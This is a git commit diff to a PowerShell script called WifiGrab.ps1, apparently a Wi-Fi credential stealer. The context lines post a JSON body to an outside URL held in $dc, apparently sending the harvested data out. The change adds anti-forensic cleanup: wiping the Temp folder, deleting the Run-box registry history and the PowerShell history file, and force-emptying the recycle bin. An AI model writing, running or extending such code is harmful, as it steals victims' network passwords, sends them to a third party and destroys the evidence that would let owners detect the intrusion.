64f929d799d482b742e6d86f0a03e5f236b59a9f
Vivien Chambe <vivien.chambe@live.com>
2024-02-27 00:07:50 +0100

    Change script

--- ps/WifiGrab.ps1
+++ ps/WifiGrab.ps1
@@ -42,8 +42,21 @@ $jsonBody = @{
 
 Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonBody
 
-# Delete history 
-Clear-History
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 
 
